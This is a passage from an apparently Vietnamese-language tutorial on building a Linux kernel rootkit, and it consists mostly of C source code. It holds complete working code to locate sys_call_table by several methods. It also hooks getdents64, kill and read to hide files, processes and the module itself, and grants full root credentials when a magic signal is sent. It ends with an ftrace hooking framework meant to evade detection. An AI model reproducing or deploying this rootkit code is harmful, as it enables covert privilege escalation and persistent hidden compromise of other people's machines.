    sys_close_addr = rk_lookup_name(SYSCALL_PREFIX "close");
    sys_read_addr  = rk_lookup_name(SYSCALL_PREFIX "read");

    if (!sys_close_addr || !sys_read_addr) {
        pr_err("method_5: cannot resolve known syscalls\n");
        return NULL;
    }

    /* Scan kernel text region.
     *
     * __START_KERNEL_map = 0xFFFFFFFF80000000 (x86-64)
     * Kernel text bắt đầu gần đây (±KASLR offset).
     *
     * MODULES_VADDR = nơi modules sống.
     * sys_call_table nằm giữa __START_KERNEL_map và MODULES_VADDR.
     *
     * PAGE_OFFSET = direct mapping base (0xFFFF888000000000 trên 4-level).
     * Scan từ đây thay vì từ 0 để tránh unmapped regions. */

    for (ptr = (unsigned long *)PAGE_OFFSET;
         ptr < (unsigned long *)ULLONG_MAX;
         ptr++) {

        /* Kiểm tra: ptr[__NR_close] == sys_close_addr?
         *           ptr[__NR_read]  == sys_read_addr?
         *
         * Nếu cả 2 match → rất likely là sys_call_table.
         * Thêm nhiều checks hơn để giảm false positive. */
        if (ptr[__NR_close] == sys_close_addr &&
            ptr[__NR_read]  == sys_read_addr) {

            pr_info("method_5 (bruteforce): sys_call_table @ 0x%lx\n",
                    (unsigned long)ptr);
            return ptr;
        }
    }

    pr_err("method_5: not found via bruteforce\n");
    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 6: /proc/kallsyms userland helper
 *
 * Concept: parse /proc/kallsyms từ TRONG kernel.
 * /proc/kallsyms chứa address của mọi symbol (nếu kptr_restrict=0).
 *
 * Nhưng: kernel code thường dùng API thay vì đọc procfs.
 * Phương pháp này hữu ích khi tất cả API-based methods fail.
 *
 * Alternative: userland program đọc /proc/kallsyms rồi
 * gửi address vào kernel module qua ioctl hoặc /proc write.
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_6_kallsyms_file(void)
{
    struct file *f;
    char buf[512];
    loff_t pos = 0;
    ssize_t bytes;
    unsigned long addr = 0;

    /* Mở /proc/kallsyms từ kernel context.
     * filp_open() là kernel equivalent của open(). */
    f = filp_open("/proc/kallsyms", O_RDONLY, 0);
    if (IS_ERR(f)) {
        pr_err("method_6: cannot open /proc/kallsyms\n");
        return NULL;
    }

    /* Đọc file line by line tìm "sys_call_table" */
    while ((bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos)) > 0) {
        buf[bytes] = '\0';

        /* Tìm "sys_call_table" trong buffer.
         * Format: "ffffffff82200300 R sys_call_table" */
        char *found = strstr(buf, " sys_call_table");
        if (found) {
            /* Parse hex address từ đầu dòng.
             * Tìm ngược từ match point tới đầu dòng. */
            char *line_start = found;
            while (line_start > buf && *(line_start - 1) != '\n')
                line_start--;

            if (kstrtoul(line_start, 16, &addr) == 0) {
                pr_info("method_6 (kallsyms file): "
                        "sys_call_table @ 0x%lx\n", addr);
                filp_close(f, NULL);
                return (unsigned long *)addr;
            }
        }
    }

    filp_close(f, NULL);
    pr_err("method_6: sys_call_table not found in kallsyms\n");
    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * VALIDATION — Verify rằng address thật sự là sys_call_table
 *
 * Sau khi tìm được candidate address, phải verify.
 * False positive = crash khi hook.
 * ────────────────────────────────────────────────────────────── */
static bool validate_syscall_table(unsigned long *table)
{
    unsigned long known_handler;

    if (!table) return false;

    /* Verify bằng cách check một vài known entries.
     *
     * sys_call_table[__NR_close] phải = address của __x64_sys_close
     * sys_call_table[__NR_read] phải = address của __x64_sys_read
     *
     * Nếu match → confidence cao là sys_call_table thật. */
    known_handler = rk_lookup_name(SYSCALL_PREFIX "close");
    if (!known_handler) {
        pr_warn("validate: cannot resolve known handler\n");
        return false;
    }

    if (table[__NR_close] != known_handler) {
        pr_warn("validate: table[__NR_close] mismatch: "
                "0x%lx != 0x%lx\n",
                table[__NR_close], known_handler);
        return false;
    }

    /* Thêm check: mọi entry phải trỏ vào kernel text section.
     * Kernel text nằm trong range [_stext, _etext].
     * Entry trỏ ra ngoài range = table sai hoặc đã bị hook. */
    unsigned long stext = rk_lookup_name("_stext");
    unsigned long etext = rk_lookup_name("_etext");

    if (stext && etext) {
        for (int i = 0; i < 10; i++) {
            if (table[i] < stext || table[i] > etext) {
                pr_warn("validate: entry %d (0x%lx) outside kernel text\n",
                        i, table[i]);
                /* Không return false ngay — có thể entry hợp lệ
                 * nhưng nằm trong module area. Log và tiếp tục. */
            }
        }
    }

    pr_info("validate: sys_call_table verified OK\n");
    return true;
}

/* ──────────────────────────────────────────────────────────────
 * UNIFIED FINDER — Thử tất cả methods theo thứ tự reliability
 * ────────────────────────────────────────────────────────────── */
static unsigned long *find_syscall_table(void)
{
    unsigned long *table;

    /* Method 2 (kprobe) là reliable nhất trên kernel hiện đại */
    table = method_2_kprobe();
    if (table && validate_syscall_table(table))
        return table;

    /* Method 3 (MSR scan) — không dùng API, pure scan */
    table = method_3_msr_scan();
    if (table && validate_syscall_table(table))
        return table;

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
    /* Method 1 chỉ available trên kernel cũ */
    table = method_1_kallsyms();
    if (table && validate_syscall_table(table))
        return table;
#endif

    /* Method 5 (bruteforce) — slow nhưng thorough */
    table = method_5_bruteforce();
    if (table && validate_syscall_table(table))
        return table;

    return NULL;
}
```

---

## Chapter 3: Syscall Table Hooking — Full Rootkit

### 3.1 Complete hookable rootkit — File & Process Hiding + Give Root

```c
/* hooks.c — Syscall hooking engine
 *
 * File này implement:
 * 1. Hook getdents64: ẩn files và processes (trong /proc)
 * 2. Hook kill: magic signal triggers (give root, hide module, hide PID)
 * 3. Hook read: filter /proc/modules output (backup hiding cho module)
 *
 * Architecture:
 *   Original flow:     user → syscall → ORIGINAL_HANDLER → return
 *   Hooked flow:       user → syscall → OUR_HOOK → ORIGINAL_HANDLER → OUR_FILTER → return
 *
 *   Hook function wrap original: gọi original handler, rồi modify kết quả
 *   trước khi return cho user. Đây gọi là "post-hook" pattern.
 *
 *   Có 2 patterns:
 *   a) Pre-hook:  modify arguments TRƯỚC KHI gọi original
 *                 Ví dụ: thay filename argument → redirect file access
 *   b) Post-hook: gọi original TRƯỚC, rồi modify return value/buffer
 *                 Ví dụ: gọi getdents64 thật, rồi filter entries từ result
 *
 *   Rootkit thường dùng post-hook cho hiding (để original function
 *   vẫn thu thập data đầy đủ, ta chỉ lọc bỏ entries cần ẩn).
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * GLOBAL STATE
 * ══════════════════════════════════════════════════════════════ */

/* Pointer tới sys_call_table — set bởi find_syscall_table() */
static unsigned long *sys_call_table = NULL;

/* Save original syscall handlers để:
 * 1. Gọi trong hook function (cần original behavior)
 * 2. Restore khi unload module (clean exit) */
static syscall_fn_t orig_getdents64 = NULL;
static syscall_fn_t orig_getdents   = NULL;
static syscall_fn_t orig_kill       = NULL;
static syscall_fn_t orig_read       = NULL;

/* Danh sách PIDs đang bị ẩn.
 * Giới hạn static 64 PIDs. Sản phẩm thật dùng dynamic list. */
#define MAX_HIDDEN_PIDS 64
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_pid_count = 0;
static DEFINE_SPINLOCK(pid_lock);  /* Lock cho concurrent access */

/* Module visibility state */
static bool module_hidden = false;

/* ══════════════════════════════════════════════════════════════
 * PID MANAGEMENT — Track processes cần ẩn
 * ══════════════════════════════════════════════════════════════ */

static bool is_pid_hidden(pid_t pid)
{
    int i;
    bool found = false;

    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&pid_lock);
    return found;
}

static void add_hidden_pid(pid_t pid)
{
    spin_lock(&pid_lock);
    if (hidden_pid_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_pid_count++] = pid;
        pr_info("rk: hiding PID %d\n", pid);
    }
    spin_unlock(&pid_lock);
}

static void remove_hidden_pid(pid_t pid)
{
    int i;
    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            /* Shift remaining entries */
            memmove(&hidden_pids[i], &hidden_pids[i + 1],
                    (hidden_pid_count - i - 1) * sizeof(pid_t));
            hidden_pid_count--;
            break;
        }
    }
    spin_unlock(&pid_lock);
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: getdents64 — Ẩn files và processes
 *
 * getdents64() là syscall đứng sau ls, find, readdir().
 *
 * Flow bình thường:
 *   ls → getdents64(fd, buffer, bufsize) → kernel fills buffer
 *   với mảng struct linux_dirent64:
 *
 *   ┌────────────┬────────────┬────────────┬─────┐
 *   │ dirent #1  │ dirent #2  │ dirent #3  │ ... │
 *   └────────────┴────────────┴────────────┴─────┘
 *
 *   Mỗi dirent:
 *   struct linux_dirent64 {
 *       u64  d_ino;        // Inode number
 *       s64  d_off;        // Offset to next dirent
 *       u16  d_reclen;     // Length of this record (variable!)
 *       u8   d_type;       // File type (DT_REG, DT_DIR, etc.)
 *       char d_name[];     // Filename (null-terminated, variable length)
 *   };
 *
 *   d_reclen là variable vì d_name có độ dài khác nhau.
 *   Các dirents packed liên tiếp, không padding.
 *   Tổng kích thước tất cả dirents = return value của getdents64().
 *
 * Hook strategy:
 *   1. Gọi original getdents64() → kernel fill buffer trong userspace
 *   2. Copy buffer từ userspace vào kernelspace
 *   3. Duyệt từng dirent, lọc bỏ entries cần ẩn
 *   4. Copy kết quả filtered trở lại userspace
 *   5. Return adjusted size (giảm đi size của entries bị lọc)
 *
 * Ẩn files:  entry có d_name bắt đầu bằng HIDDEN_PREFIX
 * Ẩn process: fd trỏ tới /proc, d_name là PID nằm trong hidden_pids[]
 * ══════════════════════════════════════════════════════════════ */

/* Kiểm tra fd có đang trỏ tới /proc hay không.
 *
 * Tại sao cần: /proc chứa thư mục cho mỗi process (named by PID).
 * ls /proc → getdents64 → ta filter entries có PID cần ẩn.
 * Nhưng getdents64 cũng được gọi cho mọi directory khác.
 * Ta chỉ muốn filter PIDs khi đọc /proc, không phải /home/user/.
 *
 * Cách check: theo fd → file struct → dentry → inode → superblock
 * Nếu superblock type là "proc" → đang đọc /proc. */
static bool is_proc_dir(int fd)
{
    struct fd f;
    struct inode *inode;
    bool is_proc = false;

    /* fdget() lấy struct file từ file descriptor.
     * Tương tự fget() nhưng lightweight (không tăng refcount
     * trong mọi trường hợp — dùng RCU protection thay vào). */
    f = fdget(fd);
    if (!f.file)
        return false;

    /* Navigate: file → dentry → inode → superblock → type name
     *
     * f.file->f_path.dentry = directory entry
     * dentry->d_inode = inode (in-memory representation of file)
     * inode->i_sb = superblock (filesystem instance)
     * i_sb->s_type->name = filesystem type name ("proc", "ext4", ...) */
    inode = file_inode(f.file);
    if (inode && inode->i_sb && inode->i_sb->s_type)
        is_proc = (strcmp(inode->i_sb->s_type->name, "proc") == 0);

    fdput(f);
    return is_proc;
}

static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    /* Extract arguments từ registers.
     * getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
     * fd    = regs->di  (arg1)
     * dirent = regs->si  (arg2, userspace pointer)
     * count  = regs->dx  (arg3) */
    int fd = (int)regs->di;
    struct linux_dirent64 __user *user_dirent =
        (struct linux_dirent64 __user *)regs->si;

    /* Gọi original getdents64.
     * Return value = total bytes of dirent data,
     * hoặc 0 (end of directory), hoặc negative (error). */
    long ret = orig_getdents64(regs);

    struct linux_dirent64 *kern_dirent = NULL;  /* Kernel-space copy */
    struct linux_dirent64 *current_entry;        /* Iterator */
    struct linux_dirent64 *prev_entry = NULL;    /* Previous entry (for unlinking) */
    unsigned long offset = 0;
    bool is_proc = false;
    long original_ret = ret;

    /* Nếu original trả về 0 (empty dir) hoặc error → pass through */
    if (ret <= 0)
        return ret;

    /* Allocate kernel buffer và copy data từ userspace.
     *
     * Tại sao copy: ta không thể safely iterate userspace buffer
     * trong kernel context (page fault risk, TOCTOU race).
     * Copy vào kernel → modify → copy ngược lại.
     *
     * GFP_KERNEL: allocation CÓ THỂ sleep (process context OK).
     * Dùng GFP_ATOMIC nếu trong interrupt context. */
    kern_dirent = kzalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;  /* Allocation fail → trả về unfiltered result */

    /* copy_from_user(): copy data từ userspace vào kernel buffer.
     * Return 0 on success, non-zero = number of bytes NOT copied.
     *
     * PHẢI dùng copy_from_user() (không phải memcpy) vì:
     * 1. Userspace pointer có thể invalid → page fault handled gracefully
     * 2. SMAP enforcement — kernel không access user pages trực tiếp
     * 3. copy_from_user() có proper access checking */
    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kfree(kern_dirent);
        return ret;
    }

    /* Kiểm tra có đang đọc /proc không (cho PID hiding) */
    is_proc = is_proc_dir(fd);

    /* ────── Duyệt và filter entries ──────
     *
     * Memory layout của kern_dirent buffer:
     *
     * offset=0          offset+=d_reclen[0]    offset+=d_reclen[1]
     *   ▼                    ▼                      ▼
     *   ┌──────────────┬────────────────┬──────────────────┐
     *   │  entry 0     │   entry 1      │   entry 2        │
     *   │  d_reclen=32 │   d_reclen=40  │   d_reclen=28    │
     *   │  d_name="."  │   d_name="rk_" │   d_name="foo"   │
     *   └──────────────┴────────────────┴──────────────────┘
     *                    ↑ HIDDEN (prefix match)
     *
     * Để "xóa" entry, ta có 2 strategies:
     *
     * Strategy A (dùng ở đây): Tăng d_reclen của entry TRƯỚC
     *   Entry trước "nuốt" entry cần ẩn bằng cách mở rộng d_reclen.
     *   Userspace code dùng d_reclen để nhảy tới entry kế tiếp,
     *   nên entry bị "nuốt" sẽ bị skip.
     *
     *   Trước:  [entry_prev, reclen=32] [entry_hidden, reclen=40] [entry_next]
     *   Sau:    [entry_prev, reclen=72]                           [entry_next]
     *
     * Strategy B: memmove entries phía sau lên, giảm total ret.
     *   Đơn giản hơn nhưng memmove costly nếu nhiều entries.
     *
     * Edge case: entry cần ẩn là entry ĐẦU TIÊN (không có prev).
     * → Dùng memmove đẩy mọi thứ lên, giảm ret.
     */

    offset = 0;
    while (offset < ret) {
        current_entry = (struct linux_dirent64 *)((char *)kern_dirent + offset);

        bool should_hide = false;

        /* Check 1: File hiding — d_name bắt đầu bằng HIDDEN_PREFIX */
        if (strncmp(current_entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0) {
            should_hide = true;
        }

        /* Check 2: Process hiding — đang đọc /proc và d_name là PID ẩn */
        if (is_proc && !should_hide) {
            long pid_val;
            /* kstrtol: convert string → long. Return 0 on success.
             * Nếu d_name không phải number → không phải PID entry → skip */
            if (kstrtol(current_entry->d_name, 10, &pid_val) == 0) {
                if (is_pid_hidden((pid_t)pid_val))
                    should_hide = true;
            }
        }

        if (should_hide) {
            /* Case: entry cần ẩn là entry đầu tiên */
            if (current_entry == kern_dirent) {
                /* Shift mọi thứ lên, overwrite entry đầu.
                 * ret giảm = size entry bị remove. */
                ret -= current_entry->d_reclen;
                memmove(current_entry,
                        (char *)current_entry + current_entry->d_reclen,
                        ret);
                /* KHÔNG tăng offset — vị trí hiện tại giờ chứa
                 * entry kế tiếp (đã shift lên), cần check lại. */
                continue;
            }

            /* Case: entry ở giữa hoặc cuối — "nuốt" vào entry trước */
            prev_entry->d_reclen += current_entry->d_reclen;
            /* Không cần memmove — entry vẫn ở đó nhưng userspace
             * sẽ skip nó vì prev->d_reclen đã mở rộng qua. */
        } else {
            /* Entry hợp lệ — ghi nhớ làm prev cho lần sau */
            prev_entry = current_entry;
        }

        offset += current_entry->d_reclen;
    }

    /* Copy kết quả filtered trở lại userspace */
    copy_to_user(user_dirent, kern_dirent, ret);

    kfree(kern_dirent);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: kill — Magic signal command interface
 *
 * Tại sao dùng kill():
 * 1. kill() là syscall "vô hại" — không ai suspect
 * 2. Có thể gọi từ bất kỳ đâu: kill -54 31337
 * 3. Flexible: dùng PID parameter để encode command
 * 4. Không cần file/socket — stateless triggering
 *
 * APT pattern: BPFDoor dùng magic packet, Drovorub dùng ioctl.
 * kill() signal approach phổ biến trong educational rootkits
 * (Diamorphine, Reptile). APT thường dùng network trigger
 * vì không cần local access.
 *
 * Command encoding:
 *   signal = MAGIC_SIGNAL (54)
 *   pid    = command selector:
 *     - MAGIC_PID (31337):      give root cho calling process
 *     - HIDE_MODULE_PID (31338): toggle module visibility
 *     - Any real PID:           toggle hide/show cho process đó
 * ══════════════════════════════════════════════════════════════ */

static asmlinkage long hooked_kill(const struct pt_regs *regs)
{
    pid_t target_pid = (pid_t)regs->di;  /* arg1: target PID */
    int   sig        = (int)regs->si;    /* arg2: signal number */

    /* Chỉ intercept magic signal — mọi signal khác pass through */
    if (sig != MAGIC_SIGNAL)
        return orig_kill(regs);

    /* ──── Command: Give Root ──── */
    if (target_pid == MAGIC_PID) {
        /* prepare_creds(): allocate bản copy của current credentials.
         *
         * Kernel credential model:
         *   Mỗi process có `cred` struct chứa:
         *   - uid/gid: real user/group ID
         *   - euid/egid: effective (used cho permission checks)
         *   - suid/sgid: saved (cho seteuid)
         *   - fsuid/fsgid: filesystem (cho file access checks)
         *   - cap_*: capabilities (fine-grained privileges)
         *
         *   Credentials là immutable — để thay đổi:
         *   1. prepare_creds() → tạo bản copy mutable
         *   2. Modify bản copy
         *   3. commit_creds() → swap bản cũ bằng bản mới atomically
         *
         *   Tại sao immutable + copy-on-write:
         *   - Thread-safe: threads khác đọc cred cũ không bị race
         *   - RCU-protected: readers lock-free
         */
        struct cred *new_cred = prepare_creds();
        if (!new_cred)
            return -ENOMEM;

        /* Set all IDs to 0 (root) */
        new_cred->uid.val   = 0;   /* Real UID */
        new_cred->gid.val   = 0;   /* Real GID */
        new_cred->euid.val  = 0;   /* Effective UID — permission checks */
        new_cred->egid.val  = 0;   /* Effective GID */
        new_cred->suid.val  = 0;   /* Saved UID */
        new_cred->sgid.val  = 0;   /* Saved GID */
        new_cred->fsuid.val = 0;   /* Filesystem UID — file access */
        new_cred->fsgid.val = 0;   /* Filesystem GID */

        /* Grant ALL Linux capabilities.
         *
         * Capabilities = fine-grained root privileges:
         *   CAP_SYS_ADMIN:  mount, syslog, many admin ops
         *   CAP_NET_RAW:    raw sockets
         *   CAP_SYS_MODULE: load/unload kernel modules
         *   CAP_SYS_PTRACE: ptrace any process
         *   CAP_DAC_OVERRIDE: bypass file permission checks
         *   ... 40+ capabilities total
         *
         * CAP_FULL_SET = bitmask với tất cả capability bits = 1.
         * Setting tất cả 5 capability sets = unrestricted root. */
        new_cred->cap_inheritable = CAP_FULL_SET;
        new_cred->cap_permitted   = CAP_FULL_SET;
        new_cred->cap_effective   = CAP_FULL_SET;
        new_cred->cap_bset        = CAP_FULL_SET;
        new_cred->cap_ambient     = CAP_FULL_SET;

        /* commit_creds(): Atomic swap cred cũ bằng cred mới.
         *
         * Từ thời điểm này, current process = root + full caps.
         * Process CÓ THỂ:
         *   - Read/write mọi file
         *   - Kill mọi process
         *   - Load kernel modules
         *   - Mount filesystems
         *   - Mọi thứ root làm được
         *
         * commit_creds() cũng free cred cũ (via RCU). */
        commit_creds(new_cred);

        return 0;  /* Return 0 (success) — user thấy kill() thành công */
    }

    /* ──── Command: Toggle Module Visibility ──── */
    if (target_pid == HIDE_MODULE_PID) {
        if (module_hidden) {
            rk_show_module();
            module_hidden = false;
        } else {
            rk_hide_module();
            module_hidden = true;
        }
        return 0;
    }

    /* ──── Command: Toggle Process Hiding ──── */
    if (is_pid_hidden(target_pid)) {
        remove_hidden_pid(target_pid);
    } else {
        add_hidden_pid(target_pid);
    }

    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * HOOK: read — Filter /proc/modules output (backup module hiding)
 *
 * Tại sao hook read():
 *   cat /proc/modules hoặc lsmod gọi read() trên /proc/modules.
 *   Output chứa tên tất cả loaded modules.
 *   Hook read() cho /proc/modules → filter dòng có tên rootkit.
 *
 * Đây là BACKUP cho module list_del hiding (Chapter 6).
 * Dù đã list_del, một số tools access /proc/modules trực tiếp
 * hoặc qua sysfs, nên cần defense-in-depth.
 *
 * CẢNH BÁO: Hook read() ảnh hưởng PERFORMANCE vì read()
 * là syscall được gọi nhiều nhất. Phải check nhanh và bail
 * sớm nếu không phải target file.
 * ══════════════════════════════════════════════════════════════ */

/* Kiểm tra xem file descriptor có trỏ tới file cụ thể không */
static bool is_target_file(int fd, const char *target_path)
{
    struct fd f;
    char buf[256];
    char *path;
    bool match = false;

    f = fdget(fd);
    if (!f.file)
        return false;

    /* d_path(): convert dentry → full path string.
     * Cần buffer vì path build ngược từ dentry lên root. */
    path = d_path(&f.file->f_path, buf, sizeof(buf));
    if (!IS_ERR(path))
        match = (strcmp(path, target_path) == 0);

    fdput(f);
    return match;
}

static asmlinkage long hooked_read(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    char __user *user_buf = (char __user *)regs->si;

    /* Gọi original read trước */
    long ret = orig_read(regs);

    char *kern_buf;
    char *line_start, *line_end;

    if (ret <= 0)
        return ret;

    /* Fast path: chỉ filter /proc/modules
     * Gọi is_target_file() chỉ khi ret > 0 để tránh overhead. */
    if (!is_target_file(fd, "/proc/modules"))
        return ret;  /* Không phải target → trả về nguyên */

    /* Copy, filter, copy back — giống pattern getdents64 */
    kern_buf = kzalloc(ret + 1, GFP_KERNEL);
    if (!kern_buf)
        return ret;

    if (copy_from_user(kern_buf, user_buf, ret)) {
        kfree(kern_buf);
        return ret;
    }
    kern_buf[ret] = '\0';

    /* /proc/modules format (mỗi dòng = 1 module):
     *   "module_name size refcount deps state address\n"
     *   Ví dụ: "rk 16384 0 - Live 0xffffffffc0a80000\n"
     *
     * Filter: xóa mọi dòng chứa tên module rootkit. */
    line_start = kern_buf;
    while (*line_start) {
        line_end = strchr(line_start, '\n');
        if (!line_end)
            break;

        /* So sánh đầu dòng với module name */
        if (strncmp(line_start, THIS_MODULE->name,
                    strlen(THIS_MODULE->name)) == 0) {
            /* Xóa dòng này bằng cách shift phần còn lại lên */
            int line_len = (line_end + 1) - line_start;
            memmove(line_start, line_end + 1,
                    ret - (line_end + 1 - kern_buf));
            ret -= line_len;
            /* Không advance line_start — vị trí này giờ chứa
             * dòng kế tiếp (đã shift) */
            continue;
        }

        line_start = line_end + 1;
    }

    copy_to_user(user_buf, kern_buf, ret);
    kfree(kern_buf);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * INSTALL / REMOVE — Hook lifecycle management
 * ══════════════════════════════════════════════════════════════ */

int rk_install_hooks(void)
{
    /* Step 1: Tìm sys_call_table */
    sys_call_table = (unsigned long *)rk_lookup_name("sys_call_table");
    if (!sys_call_table) {
        pr_err("rk: cannot find sys_call_table\n");
        return -EFAULT;
    }
    pr_info("rk: sys_call_table @ 0x%lx\n", (unsigned long)sys_call_table);

    /* Step 2: Save original handlers.
     *
     * CRITICAL: phải save TRƯỚC KHI overwrite.
     * Nếu quên → không thể gọi original → system unusable.
     * Nếu quên restore khi rmmod → crash sau khi module unloaded
     * vì syscall sẽ jump tới freed memory. */
    orig_getdents64 = (syscall_fn_t)sys_call_table[__NR_getdents64];
    orig_getdents   = (syscall_fn_t)sys_call_table[__NR_getdents];
    orig_kill       = (syscall_fn_t)sys_call_table[__NR_kill];
    orig_read       = (syscall_fn_t)sys_call_table[__NR_read];

    /* Step 3: Overwrite syscall table entries.
     *
     * Giữa unprotect và protect, code này PHẢI chạy nhanh.
     * Không allocate memory, không sleep, không gọi function
     * phức tạp — chỉ ghi 8 bytes per entry.
     *
     * Barrier(mb/wmb) không cần vì chỉ ghi aligned 8-byte values
     * — x86 guarantees atomicity cho aligned quad-word writes. */
    rk_unprotect_memory();

    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_getdents]   = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_kill]       = (unsigned long)hooked_kill;
    sys_call_table[__NR_read]       = (unsigned long)hooked_read;

    rk_protect_memory();

    pr_info("rk: syscall hooks installed\n");
    return 0;
}

void rk_remove_hooks(void)
{
    if (!sys_call_table)
        return;

    /* Restore original handlers.
     *
     * QUAN TRỌNG: phải restore theo đúng thứ tự:
     * 1. Unprotect memory
     * 2. Restore TẤT CẢ entries
     * 3. Protect memory
     *
     * Nếu module unload mà không restore → instant crash
     * khi bất kỳ process nào gọi hooked syscall, vì code
     * tại hook address đã bị freed. */
    rk_unprotect_memory();

    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_getdents]   = (unsigned long)orig_getdents;
    sys_call_table[__NR_kill]       = (unsigned long)orig_kill;
    sys_call_table[__NR_read]       = (unsigned long)orig_read;

    rk_protect_memory();

    /* Memory barrier: đảm bảo mọi CPU thấy restored values
     * trước khi module memory bị freed. */
    msleep(10);  /* Cho time để in-flight syscalls hoàn thành */

    pr_info("rk: syscall hooks removed\n");
}
```

---

## Chapter 4: Ftrace-based Hooking — Kỹ thuật hiện đại

```c
/* ftrace_hooks.c — Production-grade ftrace hooking framework
 *
 * Ftrace = Function Tracer — kernel framework cho tracing/profiling.
 * Designed cho debugging, nhưng rootkits lạm dụng để hook functions.
 *
 * TẠI SAO FTRACE THAY VÌ SYSCALL TABLE:
 *
 * 1. Không cần tìm sys_call_table
 *    → Loại bỏ bước phức tạp nhất & dễ detect nhất
 *
 * 2. Không cần disable CR0.WP
 *    → Không trigger CR0 monitoring
 *    → Không cần write vào read-only memory
 *
 * 3. Hook BẤT KỲ kernel function, không chỉ syscalls
 *    → Hook internal functions sâu hơn, khó detect hơn
 *    → Ví dụ: hook tcp_v4_connect() thay vì sys_connect()
 *
 * 4. Kernel manage concurrency
 *    → Ftrace framework handle SMP synchronization
 *    → Ít race conditions hơn manual hooking
 *
 * 5. "Legitimate" API usage
 *    → Monitoring tools cũng dùng ftrace
 *    → Khó phân biệt rootkit hook vs legitimate tracer
 *
 * CÁCH FTRACE HOẠT ĐỘNG:
 *
 * Khi CONFIG_FUNCTION_TRACER=y, compiler thêm "nop sled" hoặc
 * call __fentry__ vào đầu MỌI kernel function:
 *
 *   function_name:
 *     call __fentry__     ← 5 bytes, thường nop khi không trace
 *     push rbp
 *     mov rbp, rsp
 *     ...
 *
 * Khi không có tracer, __fentry__ call được replace bằng NOP.
 * Khi register tracer, kernel patch NOP thành call tới tracer.
 *
 * Rootkit tracer:
 *   1. Được gọi khi target function bắt đầu execute
 *   2. Nhận pt_regs (register state) làm argument
 *   3. Thay đổi regs->ip (instruction pointer)
 *      → Execution "nhảy" sang hook function thay vì tiếp tục
 *   4. Hook function gọi original khi cần
 *
 * Rootkits dùng ftrace: Sutekh, Kovid, nhiều APT tools.
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * FTRACE HOOK STRUCTURE
 *
 * Encapsulate mọi thứ cần cho 1 hook:
 * - Target function name
 * - Hook function pointer
 * - Original function pointer (for calling through)
 * - ftrace_ops (kernel tracing handle)
 * ══════════════════════════════════════════════════════════════ */

struct ftrace_hook {
    const char *name;          /* Tên kernel function cần hook */
    void *function;            /* Hook function (replacement) */
    void *original;            /* Pointer để store original function addr */
    unsigned long address;     /* Resolved address của target */
    struct ftrace_ops ops;     /* ftrace handle — kernel manages this */
};

/* Macro helper để khai báo hook entry.
 *
 * Ví dụ: HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64)
 *
 * Tạo struct ftrace_hook với:
 *   .name = "__x64_sys_getdents64"
 *   .function = hooked_getdents64
 *   .original = &orig_getdents64 (pointer tới function pointer)
 */
#define HOOK(_name, _hook, _orig) \
    {                             \
        .name = (_name),          \
        .function = (_hook),      \
        .original = (_orig),      \
    }

/* ══════════════════════════════════════════════════════════════
 * FTRACE CALLBACK — Trung tâm của kỹ thuật
 *
 * Function này được ftrace gọi mỗi khi target function execute.
 * Đây là "entry point" của hook — nơi redirect xảy ra.
 * ══════════════════════════════════════════════════════════════ */

/*
 * notrace attribute: ngăn ftrace trace CHÍNH function này.
 * Nếu không có notrace, khi function này gọi → ftrace trace nó
 * → gọi lại function này → infinite recursion → stack overflow → crash.
 *
 * Parameters:
 *   ip:        instruction pointer của target function (nơi hook)
 *   parent_ip: instruction pointer của CALLER (ai gọi target)
 *   ops:       ftrace_ops handle (ta dùng container_of lấy hook struct)
 *   fregs:     ftrace-specific register state
 */
static void notrace ftrace_thunk(unsigned long ip,
                                  unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    /* CRITICAL CHECK: chống recursion.
     *
     * Vấn đề: hook function gọi original function → original function
     * trigger ftrace → callback gọi lại → hook function gọi lại original
     * → infinite loop.
     *
     * Giải pháp: kiểm tra CALLER (parent_ip).
     * - Nếu caller nằm TRONG module (within_module) → đang call from hook
     *   → KHÔNG redirect, cho original chạy bình thường
     * - Nếu caller nằm NGOÀI module → call từ kernel/userspace
     *   → Redirect sang hook function
     *
     * within_module(addr, mod): kiểm tra addr có nằm trong
     * code range của module mod hay không.
     *
     * Flow:
     *   [kernel] → target_func ──ftrace──→ callback
     *                                       ├─ parent_ip OUTSIDE module
     *                                       └─ redirect to hook
     *
     *   [hook]  → orig_func   ──ftrace──→ callback
     *                                       ├─ parent_ip INSIDE module
     *                                       └─ DON'T redirect, let original run
     */
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;

    /* regs->ip = instruction pointer.
     * Thay đổi ip = thay đổi NƠI CPU sẽ execute tiếp theo.
     * Khi ftrace callback return, CPU jump tới regs->ip
     * = hook function address thay vì original function.
     *
     * Đây là kỹ thuật tương tự EIP/RIP overwrite trong exploitation,
     * nhưng legitimate qua ftrace API. */
}

